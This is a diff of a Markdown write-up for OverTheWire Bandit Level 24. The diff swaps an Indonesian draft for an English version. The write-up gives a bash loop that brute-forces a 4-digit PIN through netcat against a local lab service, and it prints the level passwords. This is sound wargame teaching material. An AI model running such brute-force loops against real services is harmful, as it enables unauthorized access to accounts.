@@ -1,34 +1,29 @@
-# Bandit Level 24 → Level 25
+# OverTheWire Bandit — Level 24
 
 ## Objective
-Retrieve the password for the next level by brute-forcing a 4-digit PIN required by a local service.
+Retrieve the password for the next level by brute-forcing a 4-digit PIN code on a local network service.
 
-## Environment
-- Remote Linux system (OverTheWire Bandit)
-- SSH access
-- Local TCP service with PIN verification
+## Access
+* **Host:** bandit.labs.overthewire.org
+* **Port:** 2220
+* **Username:** bandit24
 
-## Challenge Overview
-Terdapat service yang berjalan di localhost:
-- Meminta **password level 24**
-- Meminta **PIN 4 digit (0000–9999)**
-- Jika benar, service akan mengembalikan password level berikutnya
+## Method
+A daemon is listening on port **30002**. To retrieve the password, it requires the current password (`bandit24`) followed by a space and a secret 4-digit PIN (0000-9999).
 
-Masalahnya:
-- Gak ada feedback detail
-- Harus brute force
-- Tapi **masih manusiawi**, bukan rate-limit neraka
+Since the search space is small (10,000 combinations), a simple bash loop can be used to generate all possible PINs and pipe them to the network service.
 
-## Approach
-1. Siapkan loop untuk generate semua kemungkinan PIN (0000–9999).
-2. Kirim password + PIN ke service menggunakan `nc`.
-3. Filter output yang **bukan pesan gagal**.
-4. Tangkap response yang berisi password level 25.
+1.  **Scripting the Attack:** Used a loop to generate lines in the format `<password> <pin>`:
+    ```bash
+    for i in {0000..9999}; do echo "iCi86ttT4KSNe1armKiwbQNmB3YJP3q4 $i"; done | nc localhost 30002 | grep -v "Wrong!"
+    ```
+2.  **Execution:** The script sends all combinations to the port via Netcat. The `grep -v` command filters out the failure messages, leaving only the success message containing the new password.
 
-## Commands Used
+## Result
+Password for the next level retrieved successfully.
 
-Buat brute force sederhana:
-```bash
-for pin in $(seq -w 0000 9999); do
-  echo "bandit24_password $pin"
-done
+`s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ`
+
+## Key Takeaway
+* **Brute-forcing:** Rapidly trying all possible combinations is a viable attack method when the search space (entropy) is low, such as a 4-digit PIN.
+* **Scripting:** Bash loops combined with network tools (`nc`) allow for powerful, automated interaction with services.
